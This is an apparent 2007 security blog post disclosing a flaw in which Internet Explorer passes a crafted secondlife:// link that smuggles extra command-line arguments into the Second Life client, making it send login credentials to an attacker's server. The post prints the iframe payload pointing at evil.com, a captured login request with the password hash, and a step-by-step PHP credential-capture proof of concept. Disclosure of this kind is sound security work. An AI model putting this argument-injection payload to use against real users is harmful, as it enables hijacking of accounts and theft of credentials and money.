---
title: IE Pwns SecondLife
author: petko-d-petkov
date: Sun, 16 Sep 2007 10:37:53 GMT
template: this/views/post.jade
category: fucked
---

First of all, I must say that I am not really a **bug hunter**. I am more on the side of **tactical exploitation** - you know figuring out your way through the system even if it requires bug hunting and reverse engineering at the end. Anyway, the news is that IE (Internet Explorer) pwns [SecondLife](http://www.secondlife.com).

Before going into details why and how it happens, I would like to bring your attention on SecondLife for a moment. For those of you who don't follow developing technologies, SecondLife is a massive virtual world located on a couple of hundred workstations on-line. The cool thing about SecondLife is that you can do all kinds of things, like expressing your artistic side, communicating and of course making business. There is some money into SecondLife. Not that long time ago, there was this girl who made **$1000000** (**a million**) out of the on-line world. This means that crooks maybe after your virtual persona rather then your physical self. Therefore, security in virtual worlds may become almost as important as security in the physical world.

Now let's get back to the real issue. Attackers can steal the victim's login credentials, therefore hijacking their virtual, SecondLife persona, by simply tricking the victim into visiting a malicious Web page. Here is an example:

```html
<iframe src='secondlife://" -autologin -loginuri "http://evil.com/sl/record-login.php'></iframe>
```

Upon visiting the malicious page, the SecondLife client will launch and try to login automatically (**-autologin**) via the CGI located at _http://evil.com/sl/record-login.php_. At that moment, the following request is generated to the malicious CGI script. Yes, it is XML-RPC remote call:

```php
[HTTP_RAW_POST_DATA] => <methodCall>
    <methodName>login_to_simulator</methodName>
    <params>
        <param>
            <value>
                <struct>
                    <member>
                        <name>first</name>
                        <value>
                        <string>Elm</string>
                    </value>
                </member>
                <member>
                    <name>last</name>
                    <value>
                    <string>Blanco</string>
                </value>
            </member>
            <member>
                <name>passwd</name>
                <value>
                    <string>$1$**[MD5 Hash of the password here]**</string>
                </value>
            </member>
            <member>
                <name>start</name>
                <value>
                    <string>last</string>
                </value>
            </member>
            <member>
                <name>version</name>
                <value>
                    <string>1.18.2.0</string>
                </value>
            </member>
            <member>
                <name>channel</name>
                <value>
                    <string>Second Life Release</string>
                </value>
            </member>
            <member>
                <name>platform</name>
                <value>
                    <string>Win</string>
                </value>
            </member>
            ...
            ...
            ...
</methodCall>
```

Notice **[MD5 Hash of the password here]** place holder. This is where the user password is located. The password is MD5 hashed for security reasons. Well, this is definitely a good thing, although completely pointless since there are plenty of rainbow tables out there, which attackers can use to convert the hash back to a normal string.

> Keep in mind that most attackers don't even have to convert the hash back to a password string. Attackers can login with the hash itself by forging a request to one of the SecondLife authentication servers. The unhashed password is only needed in situations where the attacker wants to explore other on-line service the victim is currently registered with.

Unfortunately, I cannot construct on-line proof of concept, due to the fact that I need to expose this server to all sorts of attacks, but you can try to repeat my steps. Here is how you can do it:

1. **Get** Apache with PHP
2. **Put** the following script into a file called _login.php_:
```php
<?php
ob_start();
print_r($GLOBALS);
error_log(ob_get_contents(), 0);
ob_end_clean();
?>
```
3. **Tail** -f the PHP error log file. Or if you don't know what I am talking about, just skip this step.
4. **Make** a page with the following HTML body:
```html
<iframe src='secondlife://" -autologin -loginuri "http://localhost/login.php'></iframe>
```
5. **Open** the page inside Internet Explorer (both IE6 and IE7 are exploitable).
6. **After** the SecondLife client fails to login, you will get a message within your php error log, which gives you the credentials plus some other useful info about the victim.

_It is that simple. It is automatic and the user doesn't have to do anything. In other words, no user interaction is required. I would rate this issue as Medium risk although if the victim have a lot of Linden dollars ($L) then the situation becomes quite critical (from personal point of view). At the time of writing 1$ can be exchanged for 268.15$L._
